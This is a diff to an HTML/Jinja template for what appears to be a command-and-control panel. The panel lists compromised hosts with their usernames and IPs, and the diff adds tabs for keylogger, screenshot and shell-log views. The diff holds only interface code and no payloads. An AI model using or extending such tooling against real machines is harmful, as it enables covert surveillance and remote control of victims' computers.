@@ -1,22 +1,24 @@
 {% block content %}
-<table class="table">
+<table id="shell-table" class="table">
    <thead>
       <tr>
-         <th>HOSTNAME DOMAIN\USERNAME</th>
-         <th>INCOMING IP</th>
-         <th>SHELL ID</th>
-         <th>LAST SEEN</th>
+         <th id="shell-table-header" style="">HOSTNAME DOMAIN\USERNAME</th>
+         <th id="shell-table-header" style="">INCOMING IP</th>
+         <th id="shell-table-header" style="">SHELL ID</th>
+         <th id="shell-table-header" style="">LAST SEEN</th>
+         <th id="shell-delete" style=""></th>
       </tr>
    </thead>
    <tbody>
      {% if shells%}
      {% for shell in shells %}
       <tr>
-         <td><a id="shell-prompt" onclick='shell_handler("{{shell["shell_id"].decode()}}", "{{uid}}", "{{shell["shell_prompt"].decode().split("\\")[0]}}", "{{shell["shell_hostname"].decode()}}", "{{shell["shell_prompt"].decode().split("\\")[1]}}")'>{{shell["shell_prompt_full"].decode()}}</a></td>
+         <td><a href="#" id="shell-prompt" 
+                  onclick='$("#shell-logs-content, #shell-screenshot-content, #shell-keylogger-content, #events-tab, #main-tab, #online-shells-content, #chat-content, #chat-content-body, #events-content, #logs-content").css("display","none");$("#shell-tab, #shell-content, #shell-content-body").css("display","block");$("#shell-keylogger-button, #shell-logs-button, #shell-screenshot-button, #chat-button, #online-shells-button, #events-button, #logs-button").removeClass("active");$("#shell-button").addClass("active");;shell_handler("{{shell["shell_id"].decode()}}", "{{uid}}", "{{shell["shell_prompt"].decode().split("\\")[0]}}", "{{shell["shell_hostname"].decode()}}", "{{shell["shell_prompt"].decode().split("\\")[1]}}"); get_screenshots("{{shell["shell_id"].decode()}}");$("#shell-content-body").html($("#shell-content-body").load("/api/get/shell-log/{{shell["shell_id"].decode()}}"));setTimeout(function(){$("#shell-content-body").scrollTop($("#shell-content-body")[0].scrollHeight);}, 100);'>{{shell["shell_prompt_full"].decode()}}</a></td>
          <td>{{shell["shell_ip"].decode()}}</td>
          <td>{{shell["shell_id"].decode()}}</td>
          <td>{{shell["shell_timestamp"].decode()}}</td>
-         <td data-toggle="modal" data-target="#myModal" data-shell-id="{{shell['shell_id'].decode()}}" onclick="deleteShell(this)" class="fa fa-trash"></td>
+         <td id="shell-delete" data-toggle="modal" data-target="#myModal" data-shell-id="{{shell['shell_id'].decode()}}" onclick="deleteShell(this)" class="fa fa-trash"></td>
       </tr>
       {% endfor %}
       {% endif %}
